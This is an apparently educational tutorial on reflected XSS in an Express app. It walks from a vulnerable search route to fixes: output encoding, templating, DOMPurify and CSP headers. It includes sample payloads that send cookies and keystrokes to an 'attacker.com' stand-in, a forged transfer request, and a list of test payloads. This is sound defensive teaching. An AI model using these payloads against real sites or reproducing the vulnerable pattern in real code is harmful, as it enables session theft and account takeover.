# Understanding Reflected XSS: A Practical Deep Dive

I'll show you a real vulnerability pattern, explain the mechanics, and how to fix it.

## The Vulnerable Code

Here's a common server-side mistake (Node.js/Express):

```javascript
// VULNERABLE - Don't do this
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <p>You searched for "${query}"</p>
      </body>
    </html>
  `);
});
```

## The Attack

A malicious link sent to a victim:
```
https://yourapp.com/search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

When the victim clicks it, the server responds with:
```html
<h1>Search Results for: <img src=x onerror="fetch(...)"></h1>
```

**Why it works:**
- The browser receives HTML from a trusted source (your domain)
- It parses `<img src=x onerror=...>` as actual HTML
- The `onerror` event fires (src=x doesn't exist)
- JavaScript executes in the victim's browser with their cookies/session

The attacker never touched your server—they just crafted a URL. The server reflected untrusted input back as executable code.

## Why This Is Dangerous

```javascript
// What the attacker can do:
// 1. Steal session cookies
document.cookie

// 2. Perform actions as the user
fetch('/api/transfer-money', {
  method: 'POST',
  body: JSON.stringify({to: 'attacker', amount: 1000})
})

// 3. Redirect to phishing site
window.location = 'https://fake-bank.com'

// 4. Modify page content
document.body.innerHTML = '<h1>Hacked!</h1>'

// 5. Keylogging
document.addEventListener('keypress', e => {
  fetch('https://attacker.com/log?key=' + e.key)
})
```

## The Fix: Output Encoding

**Option 1: Use a templating engine with auto-escaping**

```javascript
// Express with EJS (auto-escapes by default)
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.render('search', { query }); // query is auto-escaped
});
```

```ejs
<!-- search.ejs -->
<h1>Search Results for: <%= query %></h1>
```

Now the payload becomes harmless:
```html
<h1>Search Results for: &lt;img src=x onerror="..."&gt;</h1>
```

**Option 2: Manual HTML escaping**

```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${escapeHtml(query)}</h1>
      </body>
    </html>
  `);
});
```

**Option 3: Use a library**

```javascript
const DOMPurify = require('isomorphic-dompurify');

app.get('/search', (req, res) => {
  const query = req.query.q;
  const safe = DOMPurify.sanitize(query);
  res.send(`<h1>Search Results for: ${safe}</h1>`);
});
```

## Context Matters: Different Escaping Rules

This is critical—**the same input needs different escaping in different contexts:**

```html
<!-- In HTML content: use HTML entity encoding -->
<p><%= userInput %></p>
<!-- Input: <script>alert(1)</script> -->
<!-- Output: &lt;script&gt;alert(1)&lt;/script&gt; -->

<!-- In HTML attributes: use HTML entity encoding + quotes -->
<input value="<%= userInput %>">
<!-- Input: " onclick="alert(1) -->
<!-- Output: &quot; onclick=&quot;alert(1) -->

<!-- In JavaScript: use JavaScript string escaping -->
<script>
  var name = "<%= userInput %>";
</script>
<!-- Input: "; alert(1); // -->
<!-- Output: \"; alert(1); // -->

<!-- In URLs: use URL encoding -->
<a href="https://example.com?redirect=<%= userInput %>">
<!-- Input: https://attacker.com -->
<!-- Output: https%3A%2F%2Fattacker.com -->
```

## Testing Your Code

```javascript
// Test cases that should all be harmless:
const payloads = [
  '<img src=x onerror="alert(1)">',
  '<svg onload="alert(1)">',
  'javascript:alert(1)',
  '"><script>alert(1)</script>',
  "'; DROP TABLE users; --"
];

payloads.forEach(payload => {
  const result = escapeHtml(payload);
  console.log(result); // Should be visible text, not executable
});
```

## Key Takeaways

1. **Never trust user input** — even from query parameters, form data, or URL fragments
2. **Escape at the point of output** — not when receiving input
3. **Use context-appropriate escaping** — HTML vs. JavaScript vs. URL
4. **Prefer templating engines** with auto-escaping over manual concatenation
5. **Defense in depth** — also use CSP headers:

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "script-src 'self'; object-src 'none'"
  );
  next();
});
```

This prevents inline scripts from executing even if XSS slips through.
